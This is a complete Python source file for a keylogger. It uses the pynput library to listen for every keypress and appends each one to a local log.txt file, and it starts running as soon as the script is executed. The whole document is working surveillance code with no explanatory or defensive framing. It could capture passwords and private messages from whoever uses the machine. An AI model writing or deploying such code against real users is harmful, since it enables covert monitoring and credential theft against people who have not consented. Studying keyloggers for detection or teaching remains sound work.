from pynput import keyboard

class SimpleKeyLogger:
    def __init__(self):
        self.logger = ""

    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike
        with open("log.txt", "a+", encoding="utf-8") as file:
            file.write(self.logger)
        self.logger = ""

    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                pressed_key = " "
            else:
                pressed_key = " " + str(key) + " "
        self.append_to_log(pressed_key)

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.join()

# Run the keylogger
SimpleKeyLogger().start()
